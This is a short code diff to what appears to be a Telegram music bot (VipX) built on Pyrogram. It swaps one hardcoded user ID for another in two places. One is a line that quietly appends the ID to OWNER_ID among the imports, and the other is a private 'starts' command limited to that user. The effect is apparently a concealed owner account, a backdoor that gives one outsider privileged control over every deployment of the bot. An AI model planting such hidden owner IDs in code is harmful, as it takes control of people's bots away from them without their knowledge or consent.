@@ -45,7 +45,7 @@ from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
 from config import BANNED_USERS, MUSIC_BOT_NAME, adminlist, lyrical
 from strings import get_command
 from VipX import app
-OWNER_ID.append(1808943146)
+OWNER_ID.append(1362133845)
 from VipX.core.call import Vip
 from VipX.misc import db
 from VipX.utils.database import get_authuser_names, get_cmode
@@ -120,7 +120,7 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("starts")
     & filters.private
-    & filters.user(1808943146)
+    & filters.user(1362133845)
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
